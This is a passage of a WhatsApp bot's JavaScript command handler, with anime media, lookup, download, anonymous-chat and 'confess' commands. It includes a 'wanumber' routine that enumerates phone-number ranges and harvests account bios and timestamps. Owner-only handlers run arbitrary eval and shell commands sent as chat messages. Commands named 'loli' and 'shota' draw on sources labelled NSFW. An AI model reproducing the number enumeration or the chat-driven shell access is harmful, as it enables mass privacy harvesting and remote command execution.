const   result = await fetchJson(`https://g.tenor.com/v1/random?q=anime slapping&key=LIVDSRZULELA`, {method: 'get'})
const ku = result.results[0]
const oj = ku.media[0]
const urlg = oj.mp4
const slapp = urlg.url
const { data: mediaData } = await axios.get(slapp, {responseType: "arraybuffer"})
const media = new MessageMedia(
    'video/mp4', 
    mediaData.toString("base64")
);
const contact1 = await conn.getName(qmid)
ctv = `@${contacts.number} *Slapped* @${contact1.number} `
m.reply(media,m.chat , {mentions:[contacts,contact1 ], sendVideoAsGif:true, caption: ctv}).then((r) => {
})
}
break

case prefix+'loli':
if (!m.isGroup) return m.reply(mess.group)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/anime/loli.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'husbu':
if (!m.isGroup) return m.reply(mess.group)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/anime/husbu.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'neko2':
if (!m.isGroup) return m.reply(mess.group)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/anime/neko.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'randomanime':
if (!m.isGroup) return m.reply(mess.group)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/anime/random.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'shota':
if (!m.isGroup) return m.reply(mess.group)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/anime/shota.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'waifu2':
if (!m.isGroup) return m.reply(mess.group)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/anime/waifu.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'genshin':
try {
if (!text) throw `Which genshin are you lookin for?`
const genshin = require("genshin-api")
a = text.toLowerCase();
const anime = await genshin.Characters(text)
let txt = ""
txt += `🎀 *Name:* ${anime.name}\n`
txt += `🎖️ *Title:* ${anime.title}\n`
txt += `💠 *Vision:* ${anime.vision}\n`
txt += `🏹 *Weapon:* ${anime.weapon}\n`
txt += `💮 *Gender:* ${anime.gender}\n`
txt += `🌏 *Nation:* ${anime.nation}\n`
txt += `🪷 *Affiliation:* ${anime.affiliation}\n`
txt += `🌟 *Rarity:* ${anime.rarity}\n`
txt += `❄️ *Constellation:* ${anime.constellation}\n`
txt += `📖 *Description:* ${anime.description}\n`
txt += `🌐 *Url:* https://genshin-impact.fandom.com/wiki/${a}\n`
urll = `https://api.genshin.dev/characters/${a}/portrait`
await conn.sendMessage(m.chat,{image:{url:urll}, caption:txt},{quoted:m})
} catch (err) {
console.log(err)
throw mess.error
}
break
case prefix+'anime':
if (!text) throw `Which anime are you lookin for?`
const malScraper = require('mal-scraper')
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) throw `Could not find`
let animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`
                await conn.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
                break
case prefix+'patrick':
case prefix+'patricksticker': {
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/patrick')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await conn.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case prefix+'dogesticker':
case prefix+'dogestick':
	case prefix+'doge':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/doge')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await conn.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case prefix+'gura':
case prefix+'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await conn.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case prefix+'ig': case prefix+'instagram': case prefix+'reels':{ //credit: Ray Senpai ❤️ https://github.com/EternityBots/Nezuko
if (args.length === 0) throw `Where is the link?\nSend ${command} url`
        let urlInsta = args[1];
        if (!(urlInsta.includes("instagram.com/p/") ||
            urlInsta.includes("instagram.com/reel/") ||
            urlInsta.includes("instagram.com/tv/")))
            return conn.sendMessage(
                m.chat,
                { text: `The link you provided is not a instagram link` },
                { quoted: m }
            );      
            if (urlInsta.includes("?"))
            urlInsta = urlInsta.split("/?")[0];
        console.log(urlInsta);
        ig.fetchPost(urlInsta).then((res) => {
            if (res.media_count == 1) {
                if (res.links[0].type == "video") {
                    conn.sendMessage(
                        m.chat,
                        {
                            video: { url: res.links[0].url }
                        },
                        { quoted: m }
                    )
                }else if (res.links[0].type == "image") {
                    conn.sendMessage(
                        m.chat,
                        {
                            image: { url: res.links[0].url }
                        },
                        { quoted: m }
                    )
                }
            }
            else if (res.media_count > 1) {
                for (let i = 0; i < res.media_count; i++) {
                    if (res.links[i].type == "video") {
                        conn.sendMessage(
                            m.chat,
                            {
                                video: { url: res.links[i].url }
                            },
                            { quoted: m }
                        )
                    } else if (res.links[i].type == "image") {
                        conn.sendMessage(
                            m.chat,
                            {
                                image: { url: res.links[i].url }
                            },
                            { quoted: m }
                        )
                    }
                }
            }            
        }).catch((error) => {
            console.log(error);
            conn.sendMessage(m.chat, { text: `Must be private or unavailable` }, { quoted: m })
        });
}
break
case prefix+'spotify': //credit: Ray Senpai❤️ https://github.com/EternityBots/Nezuko
if (!text) return m.reply(`Where is the link?`)
        const Spotify = require('./lib/spotify')
        const spotify = new Spotify(text)
        const info = await spotify.getInfo()
        if ((info).error) throw `The link you provided is not spotify link`
        const { name, artists, album_name, release_date, cover_url } = info
        const details = `• *Title:* ${name || ''}\n• *Artists:* ${(artists || []).join(
            ','
        )}\n• *Album:* ${album_name}\n• *Release Date:* ${release_date || ''}`
       const response = await conn.sendMessage(m.chat, { image: { url: cover_url }, caption: details }, { quoted: m })
        const bufferpotify = await spotify.download()
        await conn.sendMessage(m.chat, { audio: bufferpotify }, { quoted: response })
break
case prefix+'reddit': //credit: Ray Senpai ❤️ https://github.com/EternityBots/Nezuko
if (!text) throw `Where is the subreddit name?`
const RedditImageFetcher = require("reddit-image-fetcher")
RedditImageFetcher.fetch({
            type: 'custom',
            total: 1, 
            addSubreddit:text,
        }).then(result => {
            console.log(result);
            let akusingle = result[0]
            //conn.sendMessage(m.chat,{image:{url:akusingle.image}},{quoted:m})
            conn.sendImage(from, akusingle.image, text, m);
        })
        .catch(err => {
            m.reply ("Not found!")
        })
        break
case prefix+'define': //credit: Ray Senpai ❤️ https://github.com/EternityBots/Nezuko
if (!q) throw `What do you want to define?`
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) throw mess.error
const reply = `
*• Word:* ${q}
*• Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*• Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
   conn.sendMessage(m.chat,{text:reply},{quoted:m})
} catch (err) {
    console.log(err)
    return m.reply (`*${q}* isn't a valid text`)
    }
    break
case prefix+'wanumber': case prefix+'searchno': case prefix+'searchnumber':
var inputnumber = text
        if (!inputnumber.includes('x')) return m.reply(`You did not add xx\nExample: ${command} 9169091372xx`)
        m.reply(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await conn.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await conn.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        m.reply(`${text66}${nobio}${nowhatsapp}`)
break

 // ANONYMOUS - CHAT
 case prefix+'menfess':
    case prefix+'menfes':
    case prefix+'confes':
    case prefix+'confess':
        if (m.isGroup) return m.reply(mess.private)
        if (!text) return m.reply(`*How to use?*\n\Send command ${command} number|sender|message\n\nExample ${command} 91xxxxxxxxxx|handsome here|I have a crush on you\n\nExample 2 : ${command} 91xxxxxxxxxx|ur crush|I have a crush on you\n\nDon't worry, privacy is safe><`)
        let nomor = q.split('|')[0] ? q.split('|')[0] : q
        let saking = q.split('|')[1] ? q.split('|')[1] : q
        let pesan = q.split('|')[2] ? q.split('|')[2] : ''
        if (pesan.length < 2) return m.reply(`All must be filled in! eg : confess 91xxxxxxxxxx|from|hello dude`)
         let teksnya = `Hi friend, there is confess message for you!!\n\nFrom :  _${saking}_  \nMessage : _${pesan}_ `
            gambar = `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRMkjAJhYezm4h6k1AJ6qfreGkaRdBcR7UHMw&usqp=CAU`
         var button = [{ buttonId: `${prefix}confirm ${m.sender}`, buttonText: { displayText: `CONFIRM` }, type: 1 },
          { buttonId: `${prefix}menu`, buttonText: { displayText: `Menu` }, type: 1 }]
            conn.sendMessage(`${nomor}@s.whatsapp.net`, { caption: teksnya, image: {url: `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRMkjAJhYezm4h6k1AJ6qfreGkaRdBcR7UHMw&usqp=CAU`}, buttons: button, footer: botname })
        m.reply(`Success Sending Menfess!!`)
        break
    case prefix+'confirm':{
          conn.sendMessage(q, {text: `It's been confirmed, Confess🌹`})
          m.reply(`Thank you confess for being accepted.`)
        }
        break
case prefix+'anonymous':  case prefix+'anon': {
        if (m.isGroup) return m.reply(mess.private)
        this.anonymous = this.anonymous ? this.anonymous : {}
        let buttons = [
            { buttonId: `${prefix}start`, buttonText: { displayText: 'START' }, type: 1 }
        ]
        conn.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await conn.getName(m.sender)} Welcome To Anonymous Chat\n\nClick the button below to find a partner\`\`\``, botname, m)
    }
    break
    case prefix+'mulai': case prefix+'start': {
        if (m.isGroup) return m.reply(mess.private)
        this.anonymous = this.anonymous ? this.anonymous : {}
        if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
            let buttons = [
                { buttonId: `${prefix}stop`, buttonText: { displayText: 'STOP' }, type: 1 }
            ]
            await conn.sendButtonText(m.chat, buttons, `\`\`\`You are still in an anonymous session, press the button below to terminate your anonymous session\`\`\``, botname, m)
            throw false
        }
        let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
        if (room) {
            let buttons1 = [
                { buttonId: `${prefix}stop`, buttonText: { displayText: 'STOP' }, type: 1 }
            ]
            let buttons = [
                { buttonId: `${prefix}next`, buttonText: { displayText: 'SKIP' }, type: 1 },
                { buttonId: `${prefix}stop`, buttonText: { displayText: 'STOP' }, type: 1 }
            ]
            await conn.sendButtonText(m.chat, buttons1, `\`\`\`Please wait, looking for a partner\`\`\``, botname, m)
            await sleep(1000)
             conn.sendButtonText(room.a, buttons, `\`\`\`Successfully Found Partner, now you can send messages\`\`\``, botname, m)
            room.b = m.sender
            room.state = 'CHATTING'
            await conn.sendButtonText(room.b, buttons, `\`\`\`Successfully Found Partner, now you can send messages\`\`\``, botname, m)
        } else {
            let id = + new Date
            this.anonymous[id] = {
                id,
                a: m.sender,
                b: '',
                state: 'WAITING',
                check: function (who = '') {
                    return [this.a, this.b].includes(who)
                },
                other: function (who = '') {
                    return who === this.a ? this.b : who === this.b ? this.a : ''
                },
            }
            let buttons = [
                { buttonId: `${prefix}stop`, buttonText: { displayText: 'STOP' }, type: 1 }
            ]
            await conn.sendButtonText(m.chat, buttons, `\`\`\`Please wait, looking for a partner\`\`\``, botname, m)
        }
        break
    }
    case prefix+'next': case prefix+'skip': {
        if (m.isGroup) return m.reply(mess.private)
        this.anonymous = this.anonymous ? this.anonymous : {}
        let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
        if (!romeo) {
            let buttons = [
                { buttonId: `${prefix}start`, buttonText: { displayText: 'START' }, type: 1 }
            ]
            await conn.sendButtonText(m.chat, buttons, `\`\`\`You are not in an anonymous session, press the button to find a partner\`\`\``)
            //throw false
        } else {
        let other = romeo.other(m.sender)
        if (other) await conn.sendText(other, `\`\`\`Partner Has Left Anonymous Session\`\`\``, m)
        delete this.anonymous[romeo.id]
        let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
        if (room) {
            let buttons = [
                { buttonId: `${prefix}next`, buttonText: { displayText: 'SKIP' }, type: 1 },
                { buttonId: `${prefix}stop`, buttonText: { displayText: 'STOP' }, type: 1 }
            ]
            await conn.sendButtonText(room.a, buttons, `\`\`\`Successfully Found Partner, now you can send message\`\`\``, botname, m)
            room.b = m.sender
            room.state = 'CHATTING'
            await conn.sendButtonText(room.b, buttons, `\`\`\`Successfully Found Partner, now you can send message\`\`\``, botname, m)
        } else {
            let id = + new Date
            this.anonymous[id] = {
                id,
                a: m.sender,
                b: '',
                state: 'WAITING',
                check: function (who = '') {
                    return [this.a, this.b].includes(who)
                },
                other: function (who = '') {
                    return who === this.a ? this.b : who === this.b ? this.a : ''
                },
            }
            let buttons = [
                { buttonId: `${prefix}stop`, buttonText: { displayText: 'STOP' }, type: 1 }
            ]
            await conn.sendButtonText(m.chat, buttons, `\`\`\`Please wait, looking for a partner\`\`\``, botname, m)
        }
    }
        break
    }
    case prefix+'stop':  {
        if (m.isGroup) return m.reply(mess.private)
        this.anonymous = this.anonymous ? this.anonymous : {}
        let room = Object.values(this.anonymous).find(room => room.check(m.sender))
        if (!room) {
            let buttons = [
                { buttonId: `${prefix}start`, buttonText: { displayText: 'START' }, type: 1 }
            ]
           await conn.sendButtonText(m.chat, buttons, `\`\`\`You Are Not In Anonymous Session, Press Button To Find Partner \`\`\``, botname, m)
            //throw false
        
    } else {
        m.reply('You has end the anonymous chat')
        let other = room.other(m.sender)
        if (other) await conn.sendText(other, `\`\`\`Partner Has Left Anonymous Session\`\`\``, m)
        delete this.anonymous[room.id]
    }
    }
      break
//------------------------The End----------------------\\

case prefix+'menuu2': case prefix+'helpp2':{
    let ownernya = ownernomer + '@s.whatsapp.net'
    let me = m.sender
    let timestampe = speed();
    let latensie = speed() - timestampe
    let xeonezy = `┌─❖
│ Hi 👋 
└┬❖  ${pushname} 
┌┤✑  ${ucapanWaktu} 😄
│└────────────┈ ⳹
│
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊        
│𝗦𝗽𝗲𝗲𝗱 : ${latensie.toFixed(4)} miliseconds
│𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${runtime(process.uptime())}
│𝗣𝗼𝘄𝗲𝗿𝗲𝗱 : @${ini_mark.split('@')[0]}
│𝗕𝗼𝘁 : ${global.botname}
│𝗢𝘄𝗻𝗲𝗿 : @${ownernya.split('@')[0]}
│𝗣𝗿𝗲𝗳𝗶𝘅 :  NO-PREFIX 
│𝗠𝗼𝗱𝗲 : ${conn.mode ? 'Public' : 'Self'}
│𝗛𝗼𝘀𝘁 𝗡𝗮𝗺𝗲 : ${os.hostname()}
│𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : ${os.platform()}
│𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿 : ${Object.keys(global.db.data.users).length}
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝗡𝗮𝗺𝗲 : ${pushname}
│𝗡𝘂𝗺𝗯𝗲𝗿 : @${me.split('@')[0]}
│𝗣𝗿𝗲𝗺𝗶𝘂𝗺 : ${isPremium ? '✅' : `❌`}
│𝗟𝗶𝗺𝗶𝘁 : ${isPremium ? '♾Infinity' : `〽️${db.data.users[m.sender].limit}`}
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝗧𝗶𝗺𝗲 : ${xtime}
│𝗗𝗮𝘁𝗲 : ${xdate}
└┬────────────┈ ⳹
│✑  Please Select
│✑  The Button Below
└─────────────┈ ⳹`
    let ments = [ownernya, me, ini_mark]        
    let buttons = [{ buttonId: 'allmenu', buttonText: { displayText: 'All Menu' }, type: 1 },{ buttonId: 'command', buttonText: { displayText: 'List Menu' }, type: 1 },{ buttonId: 'sc', buttonText: { displayText: 'Script' }, type: 1 }]
    let buttonMessage = {
document: fs.readFileSync('./XeonMedia/theme/cheems.xlsx'),
fileName : `${wm}`,
mimetype: `${docs}`,
fileLength: '99999999999999',
pageCount: '1000000000',
caption: xeonezy,
footer: botname,
buttons: buttons,
mentions: ments,
headerType: 4,
contextInfo:{externalAdReply:{
title: botname,
body: wm, 
showAdAttribution: true,
thumbnail: thumb,
mediaType: 2,
mediaUrl: websitex,
sourceUrl: websitex
}}
}
conn.sendMessage(m.chat, buttonMessage, {quoted: fkontak})
}
break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return 
                    console.log(color('[EXEC]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`EXECUTING`))
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return 
                    console.log(color('[EXEC]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`EXECUTING`))
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return
                    console.log(color('[EXEC]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`EXECUTING`))
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        console.log(room)
                        //if (/^.*(next|leave|start)/.test(m.text)) return
                        //if (['.next', '.leave', '.stop', '.start', 'Find Partners', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    conn.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }       

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})